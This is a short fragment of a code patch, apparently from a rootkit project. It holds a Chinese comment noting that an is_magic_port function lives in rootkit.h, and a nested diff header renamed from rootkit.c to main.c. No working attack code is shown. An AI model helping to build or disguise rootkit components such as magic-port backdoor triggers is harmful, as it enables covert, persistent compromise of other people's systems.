@@ -146,8 +146,8 @@
 -}
 +// 注意：is_magic_port函数已在rootkit.h中定义，这里不需要重复定义
 
---- a/rootkit.c
-+++ b/rootkit.c
+--- a/main.c
++++ b/main.c
 @@ -9,8 +9,8 @@
  
  // 全局变量
